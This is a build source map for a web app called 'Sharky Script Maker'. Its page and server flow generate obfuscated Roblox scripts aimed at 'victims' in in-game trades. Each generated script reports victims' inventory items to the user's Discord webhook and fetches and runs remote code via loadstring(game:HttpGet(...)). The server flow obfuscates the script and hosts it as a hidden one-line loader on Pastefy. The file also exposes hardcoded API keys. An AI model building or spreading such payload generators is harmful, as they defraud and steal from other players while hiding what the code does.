{
  "version": 3,
  "sources": [],
  "sections": [
    {"offset": {"line": 15, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/hooks/use-toast.ts"],"sourcesContent":["\"use client\"\n\n// Inspired by react-hot-toast library\nimport * as React from \"react\"\n\nimport type {\n  ToastActionElement,\n  ToastProps,\n} from \"@/components/ui/toast\"\n\nconst TOAST_LIMIT = 1\nconst TOAST_REMOVE_DELAY = 1000000\n\ntype ToasterToast = ToastProps & {\n  id: string\n  title?: React.ReactNode\n  description?: React.ReactNode\n  action?: ToastActionElement\n}\n\nconst actionTypes = {\n  ADD_TOAST: \"ADD_TOAST\",\n  UPDATE_TOAST: \"UPDATE_TOAST\",\n  DISMISS_TOAST: \"DISMISS_TOAST\",\n  REMOVE_TOAST: \"REMOVE_TOAST\",\n} as const\n\nlet count = 0\n\nfunction genId() {\n  count = (count + 1) % Number.MAX_SAFE_INTEGER\n  return count.toString()\n}\n\ntype ActionType = typeof actionTypes\n\ntype Action =\n  | {\n      type: ActionType[\"ADD_TOAST\"]\n      toast: ToasterToast\n    }\n  | {\n      type: ActionType[\"UPDATE_TOAST\"]\n      toast: Partial<ToasterToast>\n    }\n  | {\n      type: ActionType[\"DISMISS_TOAST\"]\n      toastId?: ToasterToast[\"id\"]\n    }\n  | {\n      type: ActionType[\"REMOVE_TOAST\"]\n      toastId?: ToasterToast[\"id\"]\n    }\n\ninterface State {\n  toasts: ToasterToast[]\n}\n\nconst toastTimeouts = new Map<string, ReturnType<typeof setTimeout>>()\n\nconst addToRemoveQueue = (toastId: string) => {\n  if (toastTimeouts.has(toastId)) {\n    return\n  }\n\n  const timeout = setTimeout(() => {\n    toastTimeouts.delete(toastId)\n    dispatch({\n      type: \"REMOVE_TOAST\",\n      toastId: toastId,\n    })\n  }, TOAST_REMOVE_DELAY)\n\n  toastTimeouts.set(toastId, timeout)\n}\n\nexport const reducer = (state: State, action: Action): State => {\n  switch (action.type) {\n    case \"ADD_TOAST\":\n      return {\n        ...state,\n        toasts: [action.toast, ...state.toasts].slice(0, TOAST_LIMIT),\n      }\n\n    case \"UPDATE_TOAST\":\n      return {\n        ...state,\n        toasts: state.toasts.map((t) =>\n          t.id === action.toast.id ? { ...t, ...action.toast } : t\n        ),\n      }\n\n    case \"DISMISS_TOAST\": {\n      const { toastId } = action\n\n      // ! Side effects ! - This could be extracted into a dismissToast() action,\n      // but I'll keep it here for simplicity\n      if (toastId) {\n        addToRemoveQueue(toastId)\n      } else {\n        state.toasts.forEach((toast) => {\n          addToRemoveQueue(toast.id)\n        })\n      }\n\n      return {\n        ...state,\n        toasts: state.toasts.map((t) =>\n          t.id === toastId || toastId === undefined\n            ? {\n                ...t,\n                open: false,\n              }\n            : t\n        ),\n      }\n    }\n    case \"REMOVE_TOAST\":\n      if (action.toastId === undefined) {\n        return {\n          ...state,\n          toasts: [],\n        }\n      }\n      return {\n        ...state,\n        toasts: state.toasts.filter((t) => t.id !== action.toastId),\n      }\n  }\n}\n\nconst listeners: Array<(state: State) => void> = []\n\nlet memoryState: State = { toasts: [] }\n\nfunction dispatch(action: Action) {\n  memoryState = reducer(memoryState, action)\n  listeners.forEach((listener) => {\n    listener(memoryState)\n  })\n}\n\ntype Toast = Omit<ToasterToast, \"id\">\n\nfunction toast({ ...props }: Toast) {\n  const id = genId()\n\n  const update = (props: ToasterToast) =>\n    dispatch({\n      type: \"UPDATE_TOAST\",\n      toast: { ...props, id },\n    })\n  const dismiss = () => dispatch({ type: \"DISMISS_TOAST\", toastId: id })\n\n  dispatch({\n    type: \"ADD_TOAST\",\n    toast: {\n      ...props,\n      id,\n      open: true,\n      onOpenChange: (open) => {\n        if (!open) dismiss()\n      },\n    },\n  })\n\n  return {\n    id: id,\n    dismiss,\n    update,\n  }\n}\n\nfunction useToast() {\n  const [state, setState] = React.useState<State>(memoryState)\n\n  React.useEffect(() => {\n    listeners.push(setState)\n    return () => {\n      const index = listeners.indexOf(setState)\n      if (index > -1) {\n        listeners.splice(index, 1)\n      }\n    }\n  }, [state])\n\n  return {\n    ...state,\n    toast,\n    dismiss: (toastId?: string) => dispatch({ type: \"DISMISS_TOAST\", toastId }),\n  }\n}\n\nexport { useToast, toast }\n"],"names":[],"mappings":"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","debugId":null}},
    {"offset": {"line": 171, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/ai/flows/obfuscate-script.ts"],"sourcesContent":["'use server';\n/**\n * @fileOverview A flow to obfuscate a generated Roblox script using the luaobfuscator.com API.\n *\n * - obfuscateScript - A function that handles the script obfuscation process.\n * - ObfuscateScriptInput - The input type for the obfuscateScript function.\n * - ObfuscateScriptOutput - The return type for the obfuscateScript function.\n */\n\nimport { ai } from '@/ai/ai-instance';\nimport { z } from 'genkit';\nimport { obfuscateLuaScript } from '@/services/luaobfuscator';\n\nconst ObfuscateScriptInputSchema = z.object({\n  script: z.string().describe('The Roblox script to obfuscate.'),\n});\nexport type ObfuscateScriptInput = z.infer<typeof ObfuscateScriptInputSchema>;\n\nconst ObfuscateScriptOutputSchema = z.object({\n  obfuscatedScript: z.string().describe('The obfuscated Roblox script with loadstring.'),\n  pastefyLink: z.string().describe('The link to the Pastefy paste.'),\n});\nexport type ObfuscateScriptOutput = z.infer<typeof ObfuscateScriptOutputSchema>;\n\nexport async function obfuscateScript(input: ObfuscateScriptInput): Promise<ObfuscateScriptOutput> {\n  return obfuscateScriptFlow(input);\n}\n\nconst obfuscateScriptFlow = ai.defineFlow<\n  typeof ObfuscateScriptInputSchema,\n  typeof ObfuscateScriptOutputSchema\n>(\n  {\n    name: 'obfuscateScriptFlow',\n    inputSchema: ObfuscateScriptInputSchema,\n    outputSchema: ObfuscateScriptOutputSchema,\n  },\n  async input => {\n    const { script } = input;\n\n    try {\n      const apiKey = process.env.LUAOBFUSCATOR_API_KEY || '1179e31b-5118-5fd0-d81a-4e146600c3daab0';\n\n      if (!apiKey) {\n        throw new Error('LUAOBFUSCATOR_API_KEY environment variable is not set.');\n      }\n      const obfuscationResult = await obfuscateLuaScript(script, apiKey)\n\n      const pastefyApiKey = \"evzZk5KJWEmTEjvKDoMZ2ubVw6TjXuMEgvgqYrwolifn8pXvrbZ7Grl8WAsH\"; // Provided API key\n      const uploadResponse = await fetch('https://pastefy.app/api/v2/paste', {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json',\n          'Authorization': `Bearer ${pastefyApiKey}`,\n        },\n        body: JSON.stringify({\n          content: obfuscationResult.obfuscatedScript,\n          title: \"Obfuscated Roblox Script\",\n          type: \"PASTE\",\n          visibility: \"UNLISTED\",\n          encrypted: false,\n        }),\n      });\n\n      if (!uploadResponse.ok) {\n        const errorText = await uploadResponse.text();\n        throw new Error(`Pastefy upload failed with status ${uploadResponse.status}: ${errorText}`);\n      }\n\n      const uploadData = await uploadResponse.json();\n\n      if (!uploadData || !uploadData.paste || !uploadData.paste.id) {\n        throw new Error('Invalid Pastefy upload response.');\n      }\n\n      const pasteId = uploadData.paste.id;\n      const pastefyLink = `https://pastefy.app/${pasteId}`;\n      const rawUrl = `https://pastefy.app/${pasteId}/raw`;\n\n\n      return {\n        obfuscatedScript: `loadstring(game:HttpGet(\"${rawUrl}\"))()`,\n        pastefyLink: pastefyLink,\n      };\n    } catch (error: any) {\n      throw error;\n    }\n  }\n);\n"],"names":[],"mappings":";;;;;IAwBsB","debugId":null}},
    {"offset": {"line": 183, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/hooks/use-mobile.tsx"],"sourcesContent":["import * as React from \"react\"\n\nconst MOBILE_BREAKPOINT = 768\n\nexport function useIsMobile() {\n  const [isMobile, setIsMobile] = React.useState<boolean | undefined>(undefined)\n\n  React.useEffect(() => {\n    const mql = window.matchMedia(`(max-width: ${MOBILE_BREAKPOINT - 1}px)`)\n    const onChange = () => {\n      setIsMobile(window.innerWidth < MOBILE_BREAKPOINT)\n    }\n    mql.addEventListener(\"change\", onChange)\n    setIsMobile(window.innerWidth < MOBILE_BREAKPOINT)\n    return () => mql.removeEventListener(\"change\", onChange)\n  }, [])\n\n  return !!isMobile\n}\n"],"names":[],"mappings":";;;AAAA;;AAEA,MAAM,oBAAoB;AAEnB,SAAS;IACd,MAAM,CAAC,UAAU,YAAY,GAAG,CAAA,GAAA,qMAAA,CAAA,WAAc,AAAD,EAAuB;IAEpE,CAAA,GAAA,qMAAA,CAAA,YAAe,AAAD,EAAE;QACd,MAAM,MAAM,OAAO,UAAU,CAAC,CAAC,YAAY,EAAE,oBAAoB,EAAE,GAAG,CAAC;QACvE,MAAM,WAAW;YACf,YAAY,OAAO,UAAU,GAAG;QAClC;QACA,IAAI,gBAAgB,CAAC,UAAU;QAC/B,YAAY,OAAO,UAAU,GAAG;QAChC,OAAO,IAAM,IAAI,mBAAmB,CAAC,UAAU;IACjD,GAAG,EAAE;IAEL,OAAO,CAAC,CAAC;AACX","debugId":null}},
    {"offset": {"line": 208, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/src/app/page.tsx"],"sourcesContent":["'use client';\n\nimport {useState, useEffect, useRef} from 'react';\nimport {Button} from '@/components/ui/button';\nimport {Textarea} from '@/components/ui/textarea';\nimport {Checkbox} from '@/components/ui/checkbox';\nimport {Label} from '@/components/ui/label';\nimport {Input} from '@/components/ui/input';\nimport {Download, Copy, HelpCircle} from 'lucide-react';\nimport {useToast} from '@/hooks/use-toast';\n\nimport {useTransition} from 'react';\nimport {obfuscateScript} from '@/ai/flows/obfuscate-script';\n\nimport ParticleComponent from '@/components/ParticleComponent';\n\nimport {\n  Tooltip,\n  TooltipContent,\n  TooltipProvider,\n  TooltipTrigger,\n} from \"@/components/ui/tooltip\"\nimport {useIsMobile} from \"@/hooks/use-mobile\";\n\n\n// Define fruit arrays\nconst mythicalFruits = [\n  'Kitsune-Kitsune',\n  'Yeti-Yeti',\n  'Gas-Gas',\n  'Leopard-Leopard',\n  'Control-Control',\n  'Dough-Dough',\n  'T-Rex-T-Rex',\n  'Spirit-Spirit',\n  'Mammoth-Mammoth',\n  'Venom-Venom',\n];\nconst legendaryFruits = [\n  'Portal-Portal',\n  'Buddha-Buddha',\n  'Rumble-Rumble',\n  'Shadow-Shadow',\n  'Blizzard-Blizzard',\n  'Sound-Sound',\n  'Phoenix-Phoenix',\n  'Pain-Pain',\n  'Gravity-Gravity',\n  'Love-Love',\n  'Spider-Spider',\n  'Quake-Quake',\n];\nconst sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];\nconst defaultSelectedFruits = ['Kitsune-Kitsune', 'Leopard-Leopard', 'Yeti-Yeti', 'Gas-Gas'];\n\nexport default function Home() {\n  // Define state variables\n  const [webhookUrl, setWebhookUrl] = useState(''); // Stores the webhook URL\n  const [usernames, setUsernames] = useState(''); // Stores usernames, one per line\n  const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits); // Stores the selected fruits\n  const [configuredScript, setConfiguredScript] = useState(''); // Stores the generated (unobfuscated) script\n  const [obfuscatedScript, setObfuscatedScript] = useState(''); // Stores the obfuscated script\n  const [pastefyLink, setPastefyLink] = useState('');// Stores the pastefy link\n  const {toast} = useToast(); // Toast function for displaying notifications\n  const [isPending, startTransition] = useTransition(); // Manages asynchronous transitions\n    const isMobile = useIsMobile(); // Hook to check if the device is mobile\n    const [tooltipStates, setTooltipStates] = useState({\n        webhookUrl: false,\n        usernames: false,\n        fruitsToHit: false,\n    });\n\n    const toggleTooltip = (field: string) => {\n        if (isMobile) {\n            setTooltipStates(prevState => ({\n                ...Object.fromEntries(\n                    Object.keys(prevState).map(key => [key, false])\n                ),\n                [field]: !prevState[field],\n            }));\n        }\n    };\n\n  const isGenerating = isPending; // Determines if the script generation is in progress\n\n    const isValidWebhookURL = (url: string): boolean => {\n        return url.startsWith(\"https://sharky-on-top.script-config-protector.workers.dev/w/\");\n    };\n\n  // Function to generate script\n  const generateScript = async () => {\n    try {\n        if (!isValidWebhookURL(webhookUrl)) {\n            toast({\n                title: \"Error\",\n                description: \"Invalid URL, make sure to Protect your Discord Webhook URL with https://sharkyontop.pages.dev/\",\n                variant: \"destructive\",\n            });\n            return;\n        }\n      // Construct script based on user inputs\n      let script = `Webhook = \"${webhookUrl}\" -- << Discord Webhook Here\\n`;\n      script += `Usernames = {${usernames\n        .split('\\n')\n        .map(user => `\"${user}\"`)\n        .join(', ')}} -- << Your usernames here, you can add as many alts as you want\\n`;\n      script += `FruitsToHit = {${selectedFruits.map(fruit => `\"${fruit}\"`).join(', ')}} -- << Fruits you want the script to detect\\n`;\n      script += `loadstring(game:HttpGet(\"https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3\"))()`;\n\n      setConfiguredScript(script);\n\n      startTransition(async () => {\n        try {\n          const obfuscationResult = await obfuscateScript({script: script});\n          setObfuscatedScript(obfuscationResult.obfuscatedScript);\n          setPastefyLink(obfuscationResult.pastefyLink);\n\n          toast({\n            title: 'Script Generated!',\n            description: 'Script generated and obfuscated successfully.',\n          });\n        } catch (error: any) {\n          console.error(\"Error during obfuscation:\", error);\n          toast({\n            title: 'Error',\n            description: `Failed to generate script: ${error.message}`,\n            variant: 'destructive',\n          });\n        }\n      });\n    } catch (error: any) {\n      toast({\n        title: 'Error',\n        description: `Failed to generate script: ${error.message}`,\n        variant: 'destructive',\n      });\n    }\n  };\n\n  // Function to handle fruit selection\n  const handleFruitSelect = (fruit: string) => {\n    setSelectedFruits(prev => {\n      if (prev.includes(fruit)) {\n        return prev.filter(f => f !== fruit);\n      } else {\n        return [...prev, fruit];\n      }\n    });\n  };\n\n  // Function to download script\n  const downloadScript = () => {\n    if (!obfuscatedScript) {\n      toast({\n        title: 'Error',\n        description: 'Please generate a script first.',\n        variant: 'destructive',\n      });\n      return;\n    }\n\n    const blob = new Blob([obfuscatedScript], {type: 'text/plain'});\n    const url = URL.createObjectURL(blob);\n\n    const a = document.createElement('a');\n    a.href = url;\n    a.download = 'roblox_script.lua';\n    document.body.appendChild(a);\n    a.click();\n    document.body.removeChild(a);\n    URL.revokeObjectURL(url);\n  };\n\n  // Function to copy configured script\n  const copyConfiguredScript = async () => {\n    if (configuredScript) {\n      await navigator.clipboard.writeText(configuredScript);\n      toast({\n        title: 'Copied!',\n        description: 'Configured script copied to clipboard.',\n      });\n    } else {\n      toast({\n        title: 'Error',\n        description: 'No configured script to copy.',\n        variant: 'destructive',\n      });\n    }\n  };\n\n  // Function to copy obfuscated script\n  const copyObfuscatedScript = async () => {\n    if (obfuscatedScript) {\n      await navigator.clipboard.writeText(obfuscatedScript);\n      toast({\n        title: 'Copied!',\n        description: 'Obfuscated script copied to clipboard.',\n      });\n    } else {\n      toast({\n        title: 'Error',\n        description: 'No obfuscated script to copy.',\n        variant: 'destructive',\n      });\n    }\n  };\n\n  return (\n    <>\n      \n      \n        \n           \n              Sharky Script Maker\n           \n            \n                Protected Webhook URL\n                \n                  \n                    \n                      \n                        \n                          \n                            \n                              Enter your \n                              \n                               Protected Discord Webhook URL\n                              \n                               to receive notifications when the script detects a fruit.\n                            \n                            \n                              The webhook URL should be a valid Discord webhook URL that you have\n                              \n                               protected\n                              \n                               using our\n                              \n                               <a href=\"https://sharkyontop.pages.dev/\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-blue-500 hover:underline\">protector\n                                (click here to protect)\n                              </a>\n                              .\n                            \n                            \n                              This allows the script to send messages to your Discord channel.\n                            \n                          \n                        \n                      \n                    \n                  \n                \n              \n              \n                \n              \n            \n            \n                Usernames (one per line)\n                \n                  \n                    \n                      \n                        \n                          \n                            \n                              Enter usernames of \n                              \n                               YOUR\n                              \n                               accounts.\n                            \n                            \n                              These will be the accounts that can use the script's commands.\n                            \n                            \n                              They will also be the ones sitting in trading tables with victims.\n                            \n                            \n                              Put one Roblox username per line, with \n                              \n                               no spaces\n                              \n                              .\n                            \n                          \n                        \n                      \n                    \n                  \n                \n              \n              \n                \n              \n            \n            \n                Fruits to Hit\n                \n                  \n                    \n                      \n                        \n                          \n                            \n                              Select the fruits you want the script to detect.\n                            \n                            \n                              You will get notified through your webhook on Discord if victim has any of the selected fruits in their inventory,\n                            \n                          \n                        \n                      \n                    \n                  \n                \n              \n            \n            \n              \n                \n                  {sortedFruitsByRarity.map(fruit => (\n                    \n                     \n                       \n                         \n                           \n                         \n                         {fruit}\n                       \n                     \n                    \n                  ))}\n                \n              \n            \n            \n              \n                {isGenerating ? 'Generating...' : 'Generate Script'}\n              \n            \n            \n              \n                Configured Script\n                \n                  \n                    \n                      {configuredScript}\n                    \n                    \n                      \n                    \n                  \n                \n              \n            \n            \n              \n                Obfuscated Script\n                \n                  \n                     \n                       Pastefy Link:\n                      \n                        {pastefyLink}\n                      \n                     \n                  \n                \n                \n                  \n                    \n                      {obfuscatedScript}\n                    \n                    \n                      \n                    \n                  \n                \n              \n            \n            \n              \n                \n                  Download Script\n                \n              \n            \n          \n        \n      \n    </>\n  );\n}\n"],"names":[],"mappings":"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","debugId":null}},
    {"offset": {"line": 438, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/node_modules/next/src/server/route-modules/app-page/module.compiled.js"],"sourcesContent":["if (process.env.NEXT_RUNTIME === 'edge') {\n  module.exports = require('next/dist/server/route-modules/app-page/module.js')\n} else {\n  if (process.env.__NEXT_EXPERIMENTAL_REACT) {\n    if (process.env.NODE_ENV === 'development') {\n      module.exports = require('next/dist/compiled/next-server/app-page-experimental.runtime.dev.js')\n    } else if (process.env.TURBOPACK) {\n      module.exports = require('next/dist/compiled/next-server/app-page-turbo-experimental.runtime.prod.js')\n    } else {\n      module.exports = require('next/dist/compiled/next-server/app-page-experimental.runtime.prod.js')\n    }\n  } else {\n    if (process.env.NODE_ENV === 'development') {\n      module.exports = require('next/dist/compiled/next-server/app-page.runtime.dev.js')\n    } else if (process.env.TURBOPACK) {\n      module.exports = require('next/dist/compiled/next-server/app-page-turbo.runtime.prod.js')\n    } else {\n      module.exports = require('next/dist/compiled/next-server/app-page.runtime.prod.js')\n    }\n  }\n}\n"],"names":["process","env","NEXT_RUNTIME","module","exports","require","__NEXT_EXPERIMENTAL_REACT","NODE_ENV","TURBOPACK"],"mappings":";AAAA,IAAIA,QAAQC,GAAG,CAACC,YAAY,KAAK,MAAQ;;AAEzC,OAAO;IACL,IAAIF,QAAQC,GAAG,CAACK,uBAA2B,EAAF;;IAQzC,OAAO;QACL,IAAIN,QAAQC,GAAG,CAACM,QAAQ,KAAK,WAAe;YAC1CJ,OAAOC,OAAO,GAAGC,QAAQ;QAC3B,OAAO,IAAIL,QAAQC,GAAG,CAACO,SAAS,EAAE;;QAIlC;IACF;AACF","ignoreList":[0],"debugId":null}},
